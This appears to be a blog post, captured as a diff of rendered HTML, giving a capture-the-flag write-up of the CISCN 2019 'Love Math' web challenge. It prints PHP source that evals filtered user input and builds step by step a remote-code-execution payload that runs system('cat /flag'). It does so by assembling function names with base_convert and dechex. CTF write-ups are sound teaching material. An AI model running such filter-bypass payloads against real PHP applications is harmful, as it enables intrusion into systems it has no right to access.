@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>【CISCN 2019初赛】Love Math - Ting BLOG🐈</title><meta name="author" content="Ting">
+<meta name="description" content="[CISCN 2019初赛]Love Math思路源码
+"><meta name="keywords" content='Web, 做题, RCE'>
+  <meta itemprop="name" content="【CISCN 2019初赛】Love Math">
+  <meta itemprop="description" content="[CISCN 2019初赛]Love Math思路源码">
+  <meta itemprop="datePublished" content="2024-10-31T11:25:40+08:00">
+  <meta itemprop="dateModified" content="2024-10-31T11:25:40+08:00">
+  <meta itemprop="wordCount" content="310">
+  <meta itemprop="keywords" content="Web,做题,RCE"><meta property="og:url" content="http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-ciscn-2019%E5%88%9D%E8%B5%9Blove-math/">
+  <meta property="og:site_name" content="Ting BLOG🐈">
+  <meta property="og:title" content="【CISCN 2019初赛】Love Math">
+  <meta property="og:description" content="[CISCN 2019初赛]Love Math思路源码">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-10-31T11:25:40+08:00">
+    <meta property="article:modified_time" content="2024-10-31T11:25:40+08:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="做题">
+    <meta property="article:tag" content="RCE">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="【CISCN 2019初赛】Love Math">
+  <meta name="twitter:description" content="[CISCN 2019初赛]Love Math思路源码">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-ciscn-2019%E5%88%9D%E8%B5%9Blove-math/" title="【CISCN 2019初赛】Love Math - Ting BLOG🐈" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-fsctf-2023ez_eval/" title="【FSCTF 2023】EZ_eval" /><link rel="next" type="text/html" href="http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-nssround%234-swpu1zweb/" title="【NSSRound#4 SWPU】1zweb" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-ciscn-2019%E5%88%9D%E8%B5%9Blove-math/index.md" title="【CISCN 2019初赛】Love Math - Ting BLOG🐈"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "【CISCN 2019初赛】Love Math",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/2024%E5%81%9A%E9%A2%98-ciscn-2019%E5%88%9D%E8%B5%9Blove-math\/"
+    },"genre": "posts","keywords": "Web, 做题, RCE","wordcount":  310 ,
+    "url": "http:\/\/localhost:1313\/posts\/2024%E5%81%9A%E9%A2%98-ciscn-2019%E5%88%9D%E8%B5%9Blove-math\/","datePublished": "2024-10-31T11:25:40+08:00","dateModified": "2024-10-31T11:25:40+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Ting"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Ting BLOG🐈"><span class="header-title-pre">🐈</span><span class="typeit"><template>Ting BLOG</template></span></a><span class="typeit header-subtitle"><template></template></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/archives/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Ting BLOG🐈"><span class="header-title-pre">🐈</span><span class="typeit"><template>Ting BLOG</template></span></a><span class="typeit header-subtitle"><template></template></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/archives/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>【CISCN 2019初赛】Love Math</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="Tin10g.github.io" title="Author" rel=" author" class="author"><img loading="lazy" src="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png" alt="Ting" data-title="Ting" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ting</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/web--2024%E5%81%9A%E9%A2%98/" class="post-category" title="Category - Web · 2024做题"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Web · 2024做题</a></span></div><div class="post-meta-line"><span title="published on 2024-10-31 11:25:40"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-10-31">2024-10-31</time></span>&nbsp;<span title="310 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#思路">思路</a></li>
+    <li><a href="#payload">Payload</a></li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="ciscn-2019初赛love-math" class="heading-element"><span>[CISCN 2019初赛]Love Math</span>
+  <a href="#ciscn-2019%e5%88%9d%e8%b5%9blove-math" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="思路" class="heading-element"><span>思路</span>
+  <a href="#%e6%80%9d%e8%b7%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li>
+<p>源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">error_reporting(0);
+</span></span><span class="line"><span class="cl">//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+</span></span><span class="line"><span class="cl">if(!isset($_GET[&#39;c&#39;])){
+</span></span><span class="line"><span class="cl">    show_source(__FILE__);
+</span></span><span class="line"><span class="cl">}else{
+</span></span><span class="line"><span class="cl">    //例子 c=20-1
+</span></span><span class="line"><span class="cl">    $content = $_GET[&#39;c&#39;];
+</span></span><span class="line"><span class="cl">    if (strlen($content) &gt;= 80) {
+</span></span><span class="line"><span class="cl">        die(&#34;太长了不会算&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
+</span></span><span class="line"><span class="cl">    foreach ($blacklist as $blackitem) {
+</span></span><span class="line"><span class="cl">        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {
+</span></span><span class="line"><span class="cl">            die(&#34;请不要输入奇奇怪怪的字符&#34;);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+</span></span><span class="line"><span class="cl">    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
+</span></span><span class="line"><span class="cl">    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  
+</span></span><span class="line"><span class="cl">    foreach ($used_funcs[0] as $func) {
+</span></span><span class="line"><span class="cl">        if (!in_array($func, $whitelist)) {
+</span></span><span class="line"><span class="cl">            die(&#34;请不要输入奇奇怪怪的函数&#34;);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    //帮你算出答案
+</span></span><span class="line"><span class="cl">    eval(&#39;echo &#39;.$content.&#39;;&#39;);
+</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有好几个过滤</p>
+<ul>
+<li>
+<p>长度大于80过滤</p>
+</li>
+<li>
+<p>黑名单过滤：关键问题是过滤了<code>[</code>、<code>]</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>白名单过滤：主要是只能使用部分数学的函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>过滤了ascci码形式的值</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p>对于黑名单绕过</p>
+<p>常规的<code>cat /flag</code>都不能使用了</p>
+<div class="alert alert-note"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>Note</p><p><p><strong>知识点</strong></p>
+<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数</p>
+</div><p>传参为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</span></span></code></pre></td></tr></table>
+</div>
+</div><p>黑名单还过滤了<code>[</code>，<code> ]</code></p>
+<p>把这个替换为<code>{</code>，<code>}</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($_GET{a})($_GET{b})&amp;a=system&amp;b=cat /flag</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>对于白名单绕过</p>
+<p>不在白名单的部分</p>
+<ul>
+<li>
+<p><code>a</code></p>
+</li>
+<li>
+<p><code>b</code></p>
+</li>
+<li>
+<p><code>_GET</code></p>
+<blockquote>
+<p>因为<code>_GET</code>难绕过，下面单列来说</p>
+</blockquote>
+</li>
+</ul>
+<p><code>a</code>和<code>b</code>很好绕过：使用白名单的随便一个数学函数作为命名就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($_GET{cos})($_GET{asinh})&amp;cos=system&amp;asinh=cat /flag</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><code>_GET[]</code>绕过方法</p>
+<blockquote>
+<p>使用数学函数</p>
+</blockquote>
+<ul>
+<li>
+<p><code>hex2bin()</code></p>
+<p>把十六进制字符串转换为ASCII字符</p>
+<p><code>_GET</code> =&gt; <code>hex2bin(5f 47 45 54)</code></p>
+<p>但问题是：<code>hex2bin</code>不在白名单；ascci字符码也会被第三道过滤</p>
+</li>
+<li>
+<p><code>hex2bin</code>不在白名单解决</p>
+<p>使用<code>base_convert()</code>函数来转换</p>
+<blockquote>
+<p><code>base_convert()</code>：任意进制之间转换数字</p>
+</blockquote>
+<p>使用方法：</p>
+<p>hex2bin可以看做是36进制，用base_convert来转换将在<strong>10进制的数字转换为16进制</strong>就可以出现hex2bin。</p>
+<p><code>hex2bin()</code>  =&gt; <code>base_convert(37907361743,10,36)</code></p>
+<p>里面的<code>5f 47 45 54</code>要用dechex()函数将<strong>10进制数转换为16进制</strong>的数</p>
+<p><code>5f 47 45 54</code> =&gt; <code>dechex(1598506324)</code></p>
+<p>经过上面修改变为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($((base_convert(37907361743,10,36))(dechex(1598506324))){cos})($(base_convert(37907361743,10,36))(dechex(1598506324))){asinh})&amp;cos=system&amp;asinh=cat /flag</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p>但这个指令太长了</p>
+<p>综述再修改：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">base_convert(37907361743,10,36)		# “hex2bin”
+</span></span><span class="line"><span class="cl">dechex(1598506324)		# “5f474554”
+</span></span><span class="line"><span class="cl">$pi=hex2bin(5f474554)		# $pi=&#34;_GET&#34;
+</span></span><span class="line"><span class="cl">($$pi){pi}(($$pi){abs})		# $_GET{pi}($_GET{abs})
+</span></span><span class="line"><span class="cl">$_GET{pi}($_GET{abs})		# $_GET{system}($_GET{cat /flag})</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h2 id="payload" class="heading-element"><span>Payload</span>
+  <a href="#payload" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="总结" class="heading-element"><span>总结</span>
+  <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li>RCE</li>
+<li>黑名单</li>
+<li>白名单</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-10-31 11:25:40">Updated on 2024-10-31&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/2024%E5%81%9A%E9%A2%98-ciscn-2019%E5%88%9D%E8%B5%9Blove-math/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-ciscn-2019%E5%88%9D%E8%B5%9Blove-math/" data-title="【CISCN 2019初赛】Love Math" data-hashtags="Web,做题,RCE"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-ciscn-2019%E5%88%9D%E8%B5%9Blove-math/" data-hashtag="Web"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-ciscn-2019%E5%88%9D%E8%B5%9Blove-math/" data-title="【CISCN 2019初赛】Love Math"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/web/" class="post-tag" title="Tags - Web">Web</a><a href="/tags/%E5%81%9A%E9%A2%98/" class="post-tag" title="Tags - 做题">做题</a><a href="/tags/rce/" class="post-tag" title="Tags - RCE">RCE</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/2024%E5%81%9A%E9%A2%98-fsctf-2023ez_eval/" class="post-nav-item" rel="prev" title="【FSCTF 2023】EZ_eval"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>【FSCTF 2023】EZ_eval</a><a href="/posts/2024%E5%81%9A%E9%A2%98-nssround%234-swpu1zweb/" class="post-nav-item" rel="next" title="【NSSRound#4 SWPU】1zweb">【NSSRound#4 SWPU】1zweb<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
